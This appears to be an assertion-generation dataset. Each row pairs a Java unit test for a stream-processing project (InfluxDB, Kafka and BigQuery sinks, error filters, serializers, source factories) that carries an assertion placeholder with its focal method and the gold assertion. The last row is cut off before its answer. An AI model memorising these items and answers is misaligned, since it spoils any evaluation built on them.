"shouldReturnSinkMetrics() { ArrayList<String> sinkType = new ArrayList<>(); sinkType.add(""influx""); HashMap<String, List<String>> expectedMetrics = new HashMap<>(); expectedMetrics.put(""sink_type"", sinkType);  when(configuration.getString(eq(""SINK_TYPE""), anyString())).thenReturn(""influx"");  sinkOrchestrator.getSink(configuration, new String[]{}, stencilClientOrchestrator, daggerStatsDReporter); ""<AssertPlaceHolder>""; }
getTelemetry() { return metrics; }"	assertEquals(expectedMetrics, sinkOrchestrator.getTelemetry())
"shouldReturnBigQuerySink() { when(configuration.getString(eq(""SINK_TYPE""), anyString())).thenReturn(""bigquery""); when(configuration.getString(""SINK_CONNECTOR_SCHEMA_PROTO_MESSAGE_CLASS"", """")).thenReturn(""some.class""); when(configuration.getParam()).thenReturn(ParameterTool.fromMap(Collections.emptyMap())); Sink sinkFunction = sinkOrchestrator.getSink(configuration, new String[]{}, stencilClientOrchestrator, daggerStatsDReporter); ""<AssertPlaceHolder>""; }
getSink(Configuration configuration, String[] columnNames, StencilClientOrchestrator stencilClientOrchestrator, DaggerStatsDReporter daggerStatsDReporter) { String sinkType = configuration.getString(""SINK_TYPE"", ""influx""); addMetric(TelemetryTypes.SINK_TYPE.getValue(), sinkType); Sink sink; switch (sinkType) { case ""kafka"": String outputBootStrapServers = configuration.getString(Constants.SINK_KAFKA_BROKERS_KEY, """");  KafkaSerializerBuilder serializationSchema = KafkaSerializationSchemaFactory .getSerializationSchema(configuration, stencilClientOrchestrator, columnNames);  reportTelemetry(serializationSchema);  sink = KafkaSink.<Row>builder() .setBootstrapServers(outputBootStrapServers) .setKafkaProducerConfig(getProducerProperties(configuration)) .setRecordSerializer(serializationSchema.build()) .setDeliverGuarantee(DeliveryGuarantee.AT_LEAST_ONCE) .build();  break; case ""log"": sink = new LogSink(columnNames); break; case ""bigquery"": sink = BigQuerySinkBuilder.create() .setColumnNames(columnNames) .setDaggerStatsDReporter(daggerStatsDReporter) .setConfiguration(configuration) .setStencilClientOrchestrator(stencilClientOrchestrator) .build(); break; default: sink = new InfluxDBSink(new InfluxDBFactoryWrapper(), configuration, columnNames, new ErrorHandler()); } notifySubscriber(); return sink; }"	assertThat(sinkFunction, instanceOf(BigQuerySink.class))
"shouldBuildBigQuerySink() { StencilClientOrchestrator stencilClientOrchestrator = Mockito.mock(StencilClientOrchestrator.class); BigQuerySinkBuilder builder = BigQuerySinkBuilder.create(); builder.setColumnNames(new String[]{""test"", ""some_column""}); builder.setConfiguration(new Configuration(ParameterTool.fromMap(new HashMap<String, String>() {{ put(""SINK_CONNECTOR_SCHEMA_PROTO_MESSAGE_CLASS"", ""test""); }}))); builder.setStencilClientOrchestrator(stencilClientOrchestrator); Assert.""<AssertPlaceHolder>""; }
build() { ProtoSerializer protoSerializer = new ProtoSerializer( configuration.getString(""SINK_CONNECTOR_SCHEMA_PROTO_KEY_CLASS"", """"), configuration.getString(""SINK_CONNECTOR_SCHEMA_PROTO_MESSAGE_CLASS"", """"), columnNames, stencilClientOrchestrator); Configuration conf = setDefaultValues(configuration); return new BigQuerySink(conf, protoSerializer, daggerStatsDReporter); }"	assertNotNull(builder.build())
"shouldCreateSinkWriter() { ProtoSerializer protoSerializer = Mockito.mock(ProtoSerializer.class); BigQuerySinkFactory sinkFactory = Mockito.mock(BigQuerySinkFactory.class); DaggerStatsDReporter daggerStatsDReporter = Mockito.mock(DaggerStatsDReporter.class); Sink.InitContext context = Mockito.mock(Sink.InitContext.class); SinkWriterMetricGroup metricGroup = Mockito.mock(SinkWriterMetricGroup.class); Mockito.when(context.metricGroup()).thenReturn(metricGroup); org.raystack.depot.Sink mockSink = Mockito.mock(org.raystack.depot.Sink.class); Map<String, String> configMap = new HashMap<>(); Configuration configuration = new Configuration(ParameterTool.fromMap(configMap)); Mockito.when(sinkFactory.create()).thenReturn(mockSink); BigQuerySink sink = new BigQuerySink(configuration, protoSerializer, sinkFactory, daggerStatsDReporter); SinkWriter<Row, Void, Void> writer = sink.createWriter(context, null); Assert.""<AssertPlaceHolder>""; Mockito.verify(sinkFactory, Mockito.times(1)).create(); }
createWriter(InitContext context, List<Void> states) { ErrorReporter errorReporter = ErrorReporterFactory.getErrorReporter(context.metricGroup(), configuration); if (sinkFactory == null) { BigQuerySinkConfig sinkConfig = ConfigFactory.create(BigQuerySinkConfig.class, configuration.getParam().toMap()); sinkFactory = new BigQuerySinkFactory(sinkConfig, daggerStatsDReporter.buildStatsDReporter()); try { sinkFactory.init(); } catch (Exception e) { errorReporter.reportFatalException(e); throw e; } } org.raystack.depot.Sink sink = sinkFactory.create(); int batchSize = configuration.getInteger( Constants.SINK_BIGQUERY_BATCH_SIZE, Constants.SINK_BIGQUERY_BATCH_SIZE_DEFAULT); String errorsForFailing = configuration.getString( Constants.SINK_ERROR_TYPES_FOR_FAILURE, Constants.SINK_ERROR_TYPES_FOR_FAILURE_DEFAULT); Set<ErrorType> errorTypesForFailing = new HashSet<>(); for (String s : Splitter.on("","").omitEmptyStrings().split(errorsForFailing)) { errorTypesForFailing.add(ErrorType.valueOf(s.trim())); } return new BigQuerySinkWriter(protoSerializer, sink, batchSize, errorReporter, errorTypesForFailing); }"	assertTrue(writer instanceof BigQuerySinkWriter)
"IOException { InfluxDBSink influxDBSink = new InfluxDBSink(influxDBFactory, configuration, new String[]{}, errorHandler); List<Void> state = new ArrayList<>(); SinkWriter<Row, Void, Void> writer = influxDBSink.createWriter(context, state);  ""<AssertPlaceHolder>""; }
createWriter(InitContext context, List<Void> states) throws IOException { InfluxDB influxDB = influxDBFactory.connect(configuration.getString(Constants.SINK_INFLUX_URL_KEY, Constants.SINK_INFLUX_URL_DEFAULT), configuration.getString(Constants.SINK_INFLUX_USERNAME_KEY, Constants.SINK_INFLUX_USERNAME_DEFAULT), configuration.getString(Constants.SINK_INFLUX_PASSWORD_KEY, Constants.SINK_INFLUX_PASSWORD_DEFAULT)); errorHandler.init(context); influxDB.enableBatch(configuration.getInteger(Constants.SINK_INFLUX_BATCH_SIZE_KEY, Constants.SINK_INFLUX_BATCH_SIZE_DEFAULT), configuration.getInteger(Constants.SINK_INFLUX_FLUSH_DURATION_MS_KEY, Constants.SINK_INFLUX_FLUSH_DURATION_MS_DEFAULT), TimeUnit.MILLISECONDS, Executors.defaultThreadFactory(), errorHandler.getExceptionHandler()); if (errorReporter == null) { errorReporter = ErrorReporterFactory.getErrorReporter(context.metricGroup(), configuration); }  InfluxDBWriter influxDBWriter = new InfluxDBWriter(configuration, influxDB, columnNames, errorHandler, errorReporter); return influxDBWriter; }"	assertEquals(writer.getClass(), InfluxDBWriter.class)
"Exception { final int numberOfRows = 3; final String expectedFieldZeroValue = ""abc""; final int expectedFieldOneValue = 100; Instant now = Instant.now(); Row simpleFieldsRow = new Row(numberOfRows); simpleFieldsRow.setField(0, expectedFieldZeroValue); simpleFieldsRow.setField(1, expectedFieldOneValue); simpleFieldsRow.setField(2, LocalDateTime.ofInstant(now, ZoneOffset.UTC)); String[] rowColumns = {""field1"", ""field2"", ""window_timestamp""}; Point expectedPoint = Point.measurement(""test_table"") .addField(rowColumns[0], expectedFieldZeroValue) .addField(rowColumns[1], expectedFieldOneValue) .time(now.toEpochMilli(), TimeUnit.MILLISECONDS).build();  InfluxDBWriter influxDBWriter = new InfluxDBWriter(configuration, influxDb, rowColumns, errorHandler, errorReporter); influxDBWriter.write(simpleFieldsRow, context); ArgumentCaptor<Point> pointArg = ArgumentCaptor.forClass(Point.class); verify(influxDb).write(any(), any(), pointArg.capture());  ""<AssertPlaceHolder>""; }
write(Row row, Context context) throws IOException, InterruptedException { LOGGER.info(""row to influx: "" + row);  Builder pointBuilder = Point.measurement(measurementName); Map<String, Object> fields = new HashMap<>(); for (int i = 0; i < columnNames.length; i++) { String columnName = columnNames[i]; if (columnName.equals(""window_timestamp"")) { LocalDateTime timeField = (LocalDateTime) row.getField(i); ZonedDateTime zonedDateTime = timeField.atZone(ZoneOffset.UTC); pointBuilder.time(zonedDateTime.toInstant().toEpochMilli(), TimeUnit.MILLISECONDS); } else if (columnName.startsWith(""tag_"")) { pointBuilder.tag(columnName, String.valueOf(row.getField(i))); } else if (columnName.startsWith(""label_"")) { pointBuilder.tag(columnName.substring(""label_"".length()), ((String) row.getField(i))); } else { if (!(Strings.isNullOrEmpty(columnName) || row.getField(i) == null)) { fields.put(columnName, row.getField(i)); } } }  addErrorMetricsAndThrow();  try { influxDB.write(databaseName, retentionPolicy, pointBuilder.fields(fields).build()); } catch (Exception exception) { errorReporter.reportFatalException(exception); throw exception; } }"	assertEquals(expectedPoint.lineProtocol(), pointArg.getValue().lineProtocol())
"Exception { final int numberOfRows = 3; final String nullValue = null; final int integerValue = 100; Instant now = Instant.now(); Row simpleFieldsRow = new Row(numberOfRows); simpleFieldsRow.setField(0, integerValue); simpleFieldsRow.setField(1, nullValue); simpleFieldsRow.setField(2, LocalDateTime.ofInstant(now, ZoneOffset.UTC)); String[] rowColumns = {""field1"", ""field2"", ""window_timestamp""}; Point expectedPoint = Point.measurement(""test_table"") .addField(rowColumns[0], integerValue) .time(Timestamp.from(now).getTime(), TimeUnit.MILLISECONDS).build();  InfluxDBWriter influxDBWriter = new InfluxDBWriter(configuration, influxDb, rowColumns, errorHandler, errorReporter); influxDBWriter.write(simpleFieldsRow, context); ArgumentCaptor<Point> pointArg = ArgumentCaptor.forClass(Point.class); verify(influxDb).write(any(), any(), pointArg.capture());  ""<AssertPlaceHolder>""; }
write(Row row, Context context) throws IOException, InterruptedException { LOGGER.info(""row to influx: "" + row);  Builder pointBuilder = Point.measurement(measurementName); Map<String, Object> fields = new HashMap<>(); for (int i = 0; i < columnNames.length; i++) { String columnName = columnNames[i]; if (columnName.equals(""window_timestamp"")) { LocalDateTime timeField = (LocalDateTime) row.getField(i); ZonedDateTime zonedDateTime = timeField.atZone(ZoneOffset.UTC); pointBuilder.time(zonedDateTime.toInstant().toEpochMilli(), TimeUnit.MILLISECONDS); } else if (columnName.startsWith(""tag_"")) { pointBuilder.tag(columnName, String.valueOf(row.getField(i))); } else if (columnName.startsWith(""label_"")) { pointBuilder.tag(columnName.substring(""label_"".length()), ((String) row.getField(i))); } else { if (!(Strings.isNullOrEmpty(columnName) || row.getField(i) == null)) { fields.put(columnName, row.getField(i)); } } }  addErrorMetricsAndThrow();  try { influxDB.write(databaseName, retentionPolicy, pointBuilder.fields(fields).build()); } catch (Exception exception) { errorReporter.reportFatalException(exception); throw exception; } }"	assertEquals(expectedPoint.lineProtocol(), pointArg.getValue().lineProtocol())
"Exception { final int numberOfRows = 3; final String expectedFieldZeroValue = ""abc""; final int expectedFieldOneValue = 100; Instant now = Instant.now(); Row simpleFieldsRow = new Row(numberOfRows); simpleFieldsRow.setField(0, expectedFieldZeroValue); simpleFieldsRow.setField(1, expectedFieldOneValue); simpleFieldsRow.setField(2, LocalDateTime.ofInstant(now, ZoneOffset.UTC)); String[] rowColumns = {""tag_field1"", ""field2"", ""window_timestamp""}; Point expectedPoint = Point.measurement(""test_table"") .tag(rowColumns[0], expectedFieldZeroValue) .addField(rowColumns[1], expectedFieldOneValue) .time(Timestamp.from(now).getTime(), TimeUnit.MILLISECONDS).build();  InfluxDBWriter influxDBWriter = new InfluxDBWriter(configuration, influxDb, rowColumns, errorHandler, errorReporter); influxDBWriter.write(simpleFieldsRow, context); ArgumentCaptor<Point> pointArg = ArgumentCaptor.forClass(Point.class); verify(influxDb).write(any(), any(), pointArg.capture());  ""<AssertPlaceHolder>""; }
write(Row row, Context context) throws IOException, InterruptedException { LOGGER.info(""row to influx: "" + row);  Builder pointBuilder = Point.measurement(measurementName); Map<String, Object> fields = new HashMap<>(); for (int i = 0; i < columnNames.length; i++) { String columnName = columnNames[i]; if (columnName.equals(""window_timestamp"")) { LocalDateTime timeField = (LocalDateTime) row.getField(i); ZonedDateTime zonedDateTime = timeField.atZone(ZoneOffset.UTC); pointBuilder.time(zonedDateTime.toInstant().toEpochMilli(), TimeUnit.MILLISECONDS); } else if (columnName.startsWith(""tag_"")) { pointBuilder.tag(columnName, String.valueOf(row.getField(i))); } else if (columnName.startsWith(""label_"")) { pointBuilder.tag(columnName.substring(""label_"".length()), ((String) row.getField(i))); } else { if (!(Strings.isNullOrEmpty(columnName) || row.getField(i) == null)) { fields.put(columnName, row.getField(i)); } } }  addErrorMetricsAndThrow();  try { influxDB.write(databaseName, retentionPolicy, pointBuilder.fields(fields).build()); } catch (Exception exception) { errorReporter.reportFatalException(exception); throw exception; } }"	assertEquals(expectedPoint.lineProtocol(), pointArg.getValue().lineProtocol())
"Exception { final int numberOfRows = 3; final int integerTag = 123; final int expectedFieldOneValue = 100; Instant now = Instant.now(); Row simpleFieldsRow = new Row(numberOfRows); simpleFieldsRow.setField(0, integerTag); simpleFieldsRow.setField(1, expectedFieldOneValue); simpleFieldsRow.setField(2, LocalDateTime.ofInstant(now, ZoneOffset.UTC)); String[] rowColumns = {""tag_field1"", ""field2"", ""window_timestamp""}; Point expectedPoint = Point.measurement(""test_table"") .tag(rowColumns[0], String.valueOf(integerTag)) .addField(rowColumns[1], expectedFieldOneValue) .time(Timestamp.from(now).getTime(), TimeUnit.MILLISECONDS).build();  InfluxDBWriter influxDBWriter = new InfluxDBWriter(configuration, influxDb, rowColumns, errorHandler, errorReporter); influxDBWriter.write(simpleFieldsRow, context); ArgumentCaptor<Point> pointArg = ArgumentCaptor.forClass(Point.class); verify(influxDb).write(any(), any(), pointArg.capture());  ""<AssertPlaceHolder>""; }
write(Row row, Context context) throws IOException, InterruptedException { LOGGER.info(""row to influx: "" + row);  Builder pointBuilder = Point.measurement(measurementName); Map<String, Object> fields = new HashMap<>(); for (int i = 0; i < columnNames.length; i++) { String columnName = columnNames[i]; if (columnName.equals(""window_timestamp"")) { LocalDateTime timeField = (LocalDateTime) row.getField(i); ZonedDateTime zonedDateTime = timeField.atZone(ZoneOffset.UTC); pointBuilder.time(zonedDateTime.toInstant().toEpochMilli(), TimeUnit.MILLISECONDS); } else if (columnName.startsWith(""tag_"")) { pointBuilder.tag(columnName, String.valueOf(row.getField(i))); } else if (columnName.startsWith(""label_"")) { pointBuilder.tag(columnName.substring(""label_"".length()), ((String) row.getField(i))); } else { if (!(Strings.isNullOrEmpty(columnName) || row.getField(i) == null)) { fields.put(columnName, row.getField(i)); } } }  addErrorMetricsAndThrow();  try { influxDB.write(databaseName, retentionPolicy, pointBuilder.fields(fields).build()); } catch (Exception exception) { errorReporter.reportFatalException(exception); throw exception; } }"	assertEquals(expectedPoint.lineProtocol(), pointArg.getValue().lineProtocol())
"Exception { final int numberOfRows = 3; final String expectedFieldZeroValue = ""abc""; final int expectedFieldOneValue = 100; Instant now = Instant.now(); Row simpleFieldsRow = new Row(numberOfRows); simpleFieldsRow.setField(0, expectedFieldZeroValue); simpleFieldsRow.setField(1, expectedFieldOneValue); simpleFieldsRow.setField(2, LocalDateTime.ofInstant(now, ZoneOffset.UTC)); String[] rowColumns = {""label_field1"", ""field2"", ""window_timestamp""}; Point expectedPoint = Point.measurement(""test_table"") .tag(rowColumns[0].substring(""label_"".length()), expectedFieldZeroValue) .addField(rowColumns[1], expectedFieldOneValue) .time(Timestamp.from(now).getTime(), TimeUnit.MILLISECONDS).build();  InfluxDBWriter influxDBWriter = new InfluxDBWriter(configuration, influxDb, rowColumns, errorHandler, errorReporter); influxDBWriter.write(simpleFieldsRow, context); ArgumentCaptor<Point> pointArg = ArgumentCaptor.forClass(Point.class); verify(influxDb).write(any(), any(), pointArg.capture());  ""<AssertPlaceHolder>""; }
write(Row row, Context context) throws IOException, InterruptedException { LOGGER.info(""row to influx: "" + row);  Builder pointBuilder = Point.measurement(measurementName); Map<String, Object> fields = new HashMap<>(); for (int i = 0; i < columnNames.length; i++) { String columnName = columnNames[i]; if (columnName.equals(""window_timestamp"")) { LocalDateTime timeField = (LocalDateTime) row.getField(i); ZonedDateTime zonedDateTime = timeField.atZone(ZoneOffset.UTC); pointBuilder.time(zonedDateTime.toInstant().toEpochMilli(), TimeUnit.MILLISECONDS); } else if (columnName.startsWith(""tag_"")) { pointBuilder.tag(columnName, String.valueOf(row.getField(i))); } else if (columnName.startsWith(""label_"")) { pointBuilder.tag(columnName.substring(""label_"".length()), ((String) row.getField(i))); } else { if (!(Strings.isNullOrEmpty(columnName) || row.getField(i) == null)) { fields.put(columnName, row.getField(i)); } } }  addErrorMetricsAndThrow();  try { influxDB.write(databaseName, retentionPolicy, pointBuilder.fields(fields).build()); } catch (Exception exception) { errorReporter.reportFatalException(exception); throw exception; } }"	assertEquals(expectedPoint.lineProtocol(), pointArg.getValue().lineProtocol())
"shouldFilterLateRecordDrops() { LateRecordDropError lateRecordDropError = new LateRecordDropError(initContext); ""<AssertPlaceHolder>""; }
filterError(Throwable throwable) { return isLateDropping(throwable); }"	"assertTrue(lateRecordDropError .filterError(new InfluxDBException(""{""error"":""partial write: points beyond retention policy dropped=11""}"")))"
"shouldNotReturnAnyError() { LateRecordDropError lateRecordDropError = new LateRecordDropError(initContext); ""<AssertPlaceHolder>""; }
getCurrentException() { return null; }"	assertNull(lateRecordDropError.getCurrentException())
"shouldHaveNoError() { LateRecordDropError lateRecordDropError = new LateRecordDropError(initContext); ""<AssertPlaceHolder>""; }
hasException() { return false; }"	assertFalse(lateRecordDropError.hasException())
"shouldIncreaseTheCountersInCaseOfMultipleErrors() { SimpleCounter simpleCounter = new SimpleCounter(); when(metricGroup.addGroup(Constants.SINK_INFLUX_LATE_RECORDS_DROPPED_KEY)).thenReturn(metricGroupForLateRecords); when(metricGroupForLateRecords.counter(""value"")).thenReturn(simpleCounter); LateRecordDropError lateRecordDropError = new LateRecordDropError(initContext); lateRecordDropError.handle(points, new InfluxDBException(""{""error"":""partial write: points beyond retention policy dropped=11""}""));  lateRecordDropError.handle(points, new InfluxDBException(""{""error"":""partial write: points beyond retention policy dropped=5""}""));  ""<AssertPlaceHolder>""; }
handle(Iterable<Point> points, Throwable throwable) { reportDroppedPoints(parseDroppedPointsCount(throwable)); errorStatsReporter.reportNonFatalException((Exception) throwable); logFailedPoints(points, LOGGER); }"	assertEquals(16, simpleCounter.getCount())
"shouldNotReturnAnyError() { NoError noError = new NoError(); ""<AssertPlaceHolder>""; }
getCurrentException() { return null; }"	assertNull(noError.getCurrentException())
"shouldHaveNoError() { NoError noError = new NoError(); ""<AssertPlaceHolder>""; }
hasException() { return false; }"	assertFalse(noError.hasException())
"shouldFilterAllErrors() { NoError noError = new NoError();  ""<AssertPlaceHolder>""; }
filterError(Throwable throwable) { return false; }"	assertFalse(noError.filterError(new Throwable()))
"shouldHaveError() { ValidError validError = new ValidError(); ""<AssertPlaceHolder>""; }
hasException() { return true; }"	assertTrue(validError.hasException())
"shouldFilterOnlyError() { ValidError validError = new ValidError();  ""<AssertPlaceHolder>""; }
filterError(Throwable throwable) { return throwable instanceof Error; }"	assertTrue(validError.filterError(new Error()))
"shouldNotFilterException() { ValidError validError = new ValidError();  ""<AssertPlaceHolder>""; }
filterError(Throwable throwable) { return throwable instanceof Error; }"	assertFalse(validError.filterError(new Exception()))
"shouldHaveError() { ValidException validException = new ValidException(); ""<AssertPlaceHolder>""; }
hasException() { return true; }"	assertTrue(validException.hasException())
"shouldFilterException() { ValidException validException = new ValidException();  ""<AssertPlaceHolder>""; }
filterError(Throwable throwable) { return throwable instanceof Exception; }"	assertTrue(validException.filterError(new Exception()))
"shouldNotFilterError() { ValidException validException = new ValidException();  ""<AssertPlaceHolder>""; }
filterError(Throwable throwable) { return throwable instanceof Exception; }"	assertFalse(validException.filterError(new Error()))
"shouldCreateJsonSerializerForJsonSinkDataTypes() { when(configuration.getString(Constants.SINK_KAFKA_DATA_TYPE, ""PROTO"")).thenReturn(""JSON""); KafkaSerializerBuilder serializationSchema = KafkaSerializationSchemaFactory .getSerializationSchema(configuration, stencilClientOrchestrator, new String[]{""test-col""});  Assert.""<AssertPlaceHolder>""; }
getSerializationSchema(Configuration configuration, StencilClientOrchestrator stencilClientOrchestrator, String[] columnNames) { DataTypes dataTypes = DataTypes.valueOf(configuration.getString(Constants.SINK_KAFKA_DATA_TYPE, ""PROTO""));  if (dataTypes == DataTypes.JSON) { return new KafkaJsonSerializerBuilder(configuration); } return new KafkaProtoSerializerBuilder(configuration, stencilClientOrchestrator, columnNames); }"	assertTrue(serializationSchema instanceof KafkaJsonSerializerBuilder)
"shouldCreateProtoSerializerForProtoSinkDataTypes() { when(configuration.getString(Constants.SINK_KAFKA_DATA_TYPE, ""PROTO"")).thenReturn(""PROTO""); KafkaSerializerBuilder serializationSchema = KafkaSerializationSchemaFactory .getSerializationSchema(configuration, stencilClientOrchestrator, new String[]{""test-col""});  Assert.""<AssertPlaceHolder>""; }
getSerializationSchema(Configuration configuration, StencilClientOrchestrator stencilClientOrchestrator, String[] columnNames) { DataTypes dataTypes = DataTypes.valueOf(configuration.getString(Constants.SINK_KAFKA_DATA_TYPE, ""PROTO""));  if (dataTypes == DataTypes.JSON) { return new KafkaJsonSerializerBuilder(configuration); } return new KafkaProtoSerializerBuilder(configuration, stencilClientOrchestrator, columnNames); }"	assertTrue(serializationSchema instanceof KafkaProtoSerializerBuilder)
"shouldCreateJSONSerializer() { KafkaJsonSerializerBuilder kafkaJsonSerializerBuilder = new KafkaJsonSerializerBuilder(configuration); Assert.""<AssertPlaceHolder>""; }
build() { String outputTopic = configuration.getString(Constants.SINK_KAFKA_TOPIC_KEY, """"); String outputStream = configuration.getString(Constants.SINK_KAFKA_STREAM_KEY, """"); String outputJsonSchema = configuration.getString(Constants.SINK_KAFKA_JSON_SCHEMA_KEY, """"); addMetric(TelemetryTypes.OUTPUT_TOPIC.getValue(), outputTopic); addMetric(TelemetryTypes.OUTPUT_STREAM.getValue(), outputStream); notifySubscriber();  try { TypeInformation<Row> opTypeInfo = JsonRowSchemaConverter.convert(outputJsonSchema); JsonRowSerializationSchema jsonRowSerializationSchema = JsonRowSerializationSchema .builder() .withTypeInfo(opTypeInfo) .build(); return KafkaRecordSerializationSchema .builder() .setValueSerializationSchema(jsonRowSerializationSchema) .setTopic(outputTopic) .build(); } catch (IllegalArgumentException exception) { throw new InvalidJSONSchemaException(exception); } }"	assertTrue(kafkaJsonSerializerBuilder.build() instanceof KafkaRecordSerializationSchema)
"shouldCreateProtoSerializer() { KafkaProtoSerializerBuilder kafkaProtoSerializerBuilder = new KafkaProtoSerializerBuilder(configuration, stencilClientOrchestrator, new String[]{""test-col""}); KafkaRecordSerializationSchema kafkaSerializerSchema = kafkaProtoSerializerBuilder.build();  Assert.""<AssertPlaceHolder>""; }
build() { String outputTopic = configuration.getString(Constants.SINK_KAFKA_TOPIC_KEY, """"); String outputProtoKey = configuration.getString(Constants.SINK_KAFKA_PROTO_KEY, null); String outputProtoMessage = configuration.getString(Constants.SINK_KAFKA_PROTO_MESSAGE_KEY, """"); String outputStream = configuration.getString(Constants.SINK_KAFKA_STREAM_KEY, """"); addMetric(TelemetryTypes.OUTPUT_TOPIC.getValue(), outputTopic); addMetric(TelemetryTypes.OUTPUT_PROTO.getValue(), outputProtoMessage); addMetric(TelemetryTypes.OUTPUT_STREAM.getValue(), outputStream); notifySubscriber();  ProtoSerializer protoSerializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator); return new KafkaProtoSerializer(protoSerializer, outputTopic); }"	assertTrue(kafkaSerializerSchema instanceof KafkaProtoSerializer)
"shouldReturnKafkaDaggerSourceWhenConfigured() { ProtoDeserializer deserializer = Mockito.mock(ProtoDeserializer.class); when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); DaggerSource<Row> daggerSource = DaggerSourceFactory.create(streamConfig, configuration, deserializer, statsDReporterSupplierMock);  ""<AssertPlaceHolder>""; }
create(StreamConfig streamConfig, Configuration configuration, DaggerDeserializer<Row> deserializer, SerializedStatsDReporterSupplier statsDReporterSupplier) { List<DaggerSource<Row>> daggerSources = getDaggerSources(streamConfig, configuration, deserializer, statsDReporterSupplier); return daggerSources.stream() .filter(DaggerSource::canBuild) .findFirst() .orElseThrow(() -> { StatsDErrorReporter statsDErrorReporter = new StatsDErrorReporter(statsDReporterSupplier); String sourceDetails = Arrays.toString(streamConfig.getSourceDetails()); InvalidDaggerSourceException ex = new InvalidDaggerSourceException(String.format(""No suitable DaggerSource can be created as per SOURCE_DETAILS config %s"", sourceDetails)); statsDErrorReporter.reportFatalException(ex); return ex; }); }"	assertTrue(daggerSource instanceof KafkaDaggerSource)
"shouldReturnFlinkKafkaConsumerDaggerSourceWhenConfigured() { JsonDeserializer deserializer = Mockito.mock(JsonDeserializer.class); when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); DaggerSource<Row> daggerSource = DaggerSourceFactory.create(streamConfig, configuration, deserializer, statsDReporterSupplierMock);  ""<AssertPlaceHolder>""; }
create(StreamConfig streamConfig, Configuration configuration, DaggerDeserializer<Row> deserializer, SerializedStatsDReporterSupplier statsDReporterSupplier) { List<DaggerSource<Row>> daggerSources = getDaggerSources(streamConfig, configuration, deserializer, statsDReporterSupplier); return daggerSources.stream() .filter(DaggerSource::canBuild) .findFirst() .orElseThrow(() -> { StatsDErrorReporter statsDErrorReporter = new StatsDErrorReporter(statsDReporterSupplier); String sourceDetails = Arrays.toString(streamConfig.getSourceDetails()); InvalidDaggerSourceException ex = new InvalidDaggerSourceException(String.format(""No suitable DaggerSource can be created as per SOURCE_DETAILS config %s"", sourceDetails)); statsDErrorReporter.reportFatalException(ex); return ex; }); }"	assertTrue(daggerSource instanceof FlinkKafkaConsumerDaggerSource)
"shouldReturnParquetDaggerSourceWhenConfigured() { SimpleGroupDeserializer deserializer = Mockito.mock(SimpleGroupDeserializer.class); when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.BOUNDED)}); DaggerSource<Row> daggerSource = DaggerSourceFactory.create(streamConfig, configuration, deserializer, statsDReporterSupplierMock);  ""<AssertPlaceHolder>""; }
create(StreamConfig streamConfig, Configuration configuration, DaggerDeserializer<Row> deserializer, SerializedStatsDReporterSupplier statsDReporterSupplier) { List<DaggerSource<Row>> daggerSources = getDaggerSources(streamConfig, configuration, deserializer, statsDReporterSupplier); return daggerSources.stream() .filter(DaggerSource::canBuild) .findFirst() .orElseThrow(() -> { StatsDErrorReporter statsDErrorReporter = new StatsDErrorReporter(statsDReporterSupplier); String sourceDetails = Arrays.toString(streamConfig.getSourceDetails()); InvalidDaggerSourceException ex = new InvalidDaggerSourceException(String.format(""No suitable DaggerSource can be created as per SOURCE_DETAILS config %s"", sourceDetails)); statsDErrorReporter.reportFatalException(ex); return ex; }); }"	assertTrue(daggerSource instanceof ParquetDaggerSource)
"shouldBeAbleToBuildAStreamWithKafkaDaggerSourceAndProtoSchema() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); when(streamConfig.getEventTimestampFieldIndex()).thenReturn(""5""); when(streamConfig.getDataType()).thenReturn(""PROTO""); when(streamConfig.getProtoClass()).thenReturn(""com.tests.TestMessage""); when(streamConfig.getSchemaTable()).thenReturn(""data_stream""); when(stencilConfig.getCacheAutoRefresh()).thenReturn(false); when(stencilClientOrchestrator.createStencilConfig()).thenReturn(stencilConfig); when(stencilClientOrchestrator.getStencilClient()).thenReturn(stencilClient); when(stencilClient.get(""com.tests.TestMessage"")).thenReturn(TestBookingLogMessage.getDescriptor());  Stream.Builder builder = new Stream.Builder(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplierMock); Stream stream = builder.build();  ""<AssertPlaceHolder>""; }
build() { DaggerDeserializer<Row> daggerDeserializer = DaggerDeserializerFactory.create(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplier); DaggerSource<Row> daggerSource = DaggerSourceFactory.create(streamConfig, configuration, daggerDeserializer, statsDReporterSupplier); return new Stream(daggerSource, streamConfig.getSchemaTable()); }"	assertTrue(stream.getDaggerSource() instanceof KafkaDaggerSource)
"shouldBeAbleToBuildAStreamWithFlinkKafkaConsumerDaggerSourceAndProtoSchema() { HashMap<String, String> kafkaPropMap = new HashMap<>(); kafkaPropMap.put(""group.id"", ""dummy-consumer-group""); kafkaPropMap.put(""bootstrap.servers"", ""localhost:9092"");  Properties properties = new Properties(); properties.putAll(kafkaPropMap);  when(streamConfig.getKafkaProps(any())).thenReturn(properties); when(streamConfig.getTopicPattern()).thenReturn(Pattern.compile(""test-topic"")); when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); when(streamConfig.getEventTimestampFieldIndex()).thenReturn(""5""); when(streamConfig.getDataType()).thenReturn(""PROTO""); when(streamConfig.getProtoClass()).thenReturn(""com.tests.TestMessage""); when(streamConfig.getSchemaTable()).thenReturn(""data_stream""); when(stencilConfig.getCacheAutoRefresh()).thenReturn(false); when(stencilClientOrchestrator.createStencilConfig()).thenReturn(stencilConfig); when(stencilClientOrchestrator.getStencilClient()).thenReturn(stencilClient); when(stencilClient.get(""com.tests.TestMessage"")).thenReturn(TestBookingLogMessage.getDescriptor());  Stream.Builder builder = new Stream.Builder(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplierMock); Stream stream = builder.build();  ""<AssertPlaceHolder>""; }
